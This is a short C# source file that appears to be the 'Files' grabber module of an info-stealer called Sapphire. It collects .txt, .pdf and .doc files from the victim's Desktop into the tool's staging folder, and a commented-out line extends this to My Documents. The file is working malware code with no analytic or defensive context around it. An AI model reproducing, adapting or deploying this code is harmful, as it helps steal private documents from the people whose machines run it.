using System;
using System.IO;
using Sapphire.Modules.Helpers;

namespace Sapphire.Modules.Grabbers
{
    class Files
    {
        private static string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        //private static string documents = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        public static void Grab()
        {
            string[] desktopFiles = Directory.GetFiles(desktop); 
            string path = FileManager.CreateDirectory(FileManager.GetWorkDirectory() + "Files");

            if (string.IsNullOrEmpty(path))
                throw new Exception("[ERROR] can't create grab directory");

            foreach (string f in desktopFiles) 
            {
                string extension = Path.GetExtension(f); 
                if (extension == ".txt" || extension == ".pdf" || extension == ".doc") 
                {
                    File.Copy(f, path + "\\" + Path.GetFileName(f));
                }
            }
        }
    }
}
